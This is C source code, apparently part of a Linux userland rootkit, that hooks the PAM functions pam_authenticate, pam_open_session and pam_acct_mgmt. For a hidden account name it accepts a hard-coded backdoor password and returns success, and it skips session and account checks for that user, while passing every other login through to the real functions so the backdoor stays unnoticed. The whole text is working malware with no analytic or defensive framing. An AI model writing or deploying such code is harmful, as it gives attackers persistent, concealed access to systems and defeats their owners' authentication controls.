int pam_authenticate(pam_handle_t *pamh, int flags){   
    char *user = get_username(pamh),
         prompt[512],
         *pw;
    int got_pw;

    hook(CPAM_AUTHENTICATE);
    if(user == NULL) return (long)call(CPAM_AUTHENTICATE, pamh, flags);

    if(!strcmp(user, PAM_UNAME)){
        if(process("login")) return (long)call(CPAM_AUTHENTICATE, pamh, flags);

        snprintf(prompt, sizeof(prompt), "* Password for %s: ", PAM_UNAME);
        pam_prompt(pamh, 1, &pw, "%s", prompt);

        got_pw = !strcmp(crypt(pw, BACKDOOR_PASS), BACKDOOR_PASS);
        memset(pw, 0, strlen(pw));
        if(got_pw) return PAM_SUCCESS;
        return PAM_USER_UNKNOWN;
    }

    return (long)call(CPAM_AUTHENTICATE, pamh, flags);
}

int pam_open_session(pam_handle_t *pamh, int flags){
    char *user = get_username(pamh);
    hook(CPAM_OPEN_SESSION);
    if(user == NULL) return (long)call(CPAM_OPEN_SESSION, pamh, flags);

    if(!strcmp(user, PAM_UNAME)) return PAM_SUCCESS;
    return (long)call(CPAM_OPEN_SESSION, pamh, flags);
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags){
    char *user = get_username(pamh);
    hook(CPAM_ACCT_MGMT);
    if(user == NULL) return (long)call(CPAM_ACCT_MGMT, pamh, flags);

    if(!strcmp(user, PAM_UNAME)) return PAM_SUCCESS;
    return (long)call(CPAM_ACCT_MGMT, pamh, flags);
}
